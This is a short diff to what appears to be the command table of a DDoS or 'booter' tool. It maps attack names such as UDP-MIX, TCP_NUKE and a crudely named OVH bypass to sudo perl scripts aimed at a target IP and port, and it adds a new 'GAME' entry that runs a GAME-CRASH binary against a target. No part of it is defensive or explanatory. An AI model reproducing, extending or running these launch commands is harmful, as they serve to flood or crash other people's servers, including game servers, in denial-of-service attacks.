@@ -41,3 +41,5 @@ UDP-MIX : sudo perl UDP_MIX.pl %ip% 9999
 TCP_NUKE : sudo perl TCP_VOX.pl %ip% 9999
 
 OVH-RAPE : sudo perl OVHBYPASS.pl %ip% %port% 9999
+
+GAME : sudo ./GAME-CRASH %ip% %port%
